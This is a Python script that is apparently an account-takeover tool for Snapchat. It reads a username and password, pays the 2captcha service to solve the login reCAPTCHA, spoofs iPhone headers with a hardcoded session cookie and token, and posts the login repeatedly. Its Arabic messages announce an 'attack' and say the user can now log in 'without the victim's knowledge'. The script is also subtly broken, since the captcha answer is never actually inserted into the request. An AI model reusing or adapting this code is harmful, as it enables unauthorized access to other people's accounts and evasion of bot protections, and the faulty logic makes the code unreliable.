import requests, time, colorama, json, random, string
from colorama import Fore, init

init()

green_color = "\033[1;32m"

user = input('username : ')
flo = input('password : ')



class report:
    def __init__(self):
        self.session = requests.Session()
        self.site_key = "6LdXz5AUAAAAAB78fpaii98MC7szsQiXs-TH13q_"
        self.url = "https://accounts.snapchat.com/accounts/login"
        self.contents = open('config.json', 'r', encoding="latin-1", errors='ignore')
        self.data = json.load(self.contents)
        self.API_KEY = self.data['api_key']

    def captcha(self):
        try:
            captcha_id = self.session.post(
                "http://2captcha.com/in.php?key={}&method=userrecaptcha&googlekey={}&pageurl={}".format(self.API_KEY,
                                                                                                        self.site_key,
                                                                                                        self.url)).text.split(
                '|')[1]
            recaptcha_answer = self.session.get(
                "http://2captcha.com/res.php?key={}&action=get&id={}".format(self.API_KEY, captcha_id)).text
            print(Fore.YELLOW + "[ جاري الهجوم ] ربما يتم التاخير قليلا ...")
            while 'CAPCHA_NOT_READY' in recaptcha_answer:
                time.sleep(7)
                recaptcha_answer = self.session.get(
                    "http://2captcha.com/res.php?key={}&action=get&id={}".format(self.API_KEY, captcha_id)).text
            recaptcha_answer = recaptcha_answer.split('|')[1]
            return recaptcha_answer
        except Exception as e:
            print(e)


    def report(self):
        answer1 = self.captcha()
        headers = {
            "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 13_6_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148",
            "Host": "accounts.snapchat.com",
            "Accept-Encoding": "gzip, deflate",
            "Cookie": "xsrf_token=Alpveu8e9UY9g8rLMtqDWg; sc-cookies-accepted=true; Preferences=true; Performance=true; Marketing=true; sc-cookies-accepted=true; Preferences=true; Performance=true; Marketing=true; sc-cookies-popup-tracking=track; sc-a-session=MDAxOjAwMjqgfggwcpkFnQo0zh2ZrgiBOiszP3d7-vr4mEacGK27B_pT1ZHrzDv0M_yOcA4idzavH0s1wHeP8IVapg; sc-a-csrf=true; web_client_id=6d6b02e5-7305-4976-890b-d5bb2f1cbb59; oauth_client_id=Z2Vv",
            "Content-Type": "application/x-www-form-urlencoded",
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
            "Accept-Language": "ar,en-US;q=0.7,en;q=0.3",
            "Referer": "https://accounts.snapchat.com/",
            "Content-Length": "1130",
            "Origin": "https://accounts.snapchat.com",
            "Upgrade-Insecure-Requests": "1",
            "Connection": "close",
            "DNT": "1"
        }


        data = 'username='+user+'&password='+flo+'&xsrf_token=Alpveu8e9UY9g8rLMtqDWg'.format(answer1)
        send_report = self.session.post("https://accounts.snapchat.com/accounts/login", data=data, headers=headers)
        if send_report.status_code == 302:
            print(green_color + "[GOOD] "+ flo + "")
            print('الان تستطيع الدخول بدون علم الضحية')
        else:
            print(Fore.RED + "[Error] ")


if __name__ == "__main__":
    while True:
        start = report()
        start.report()
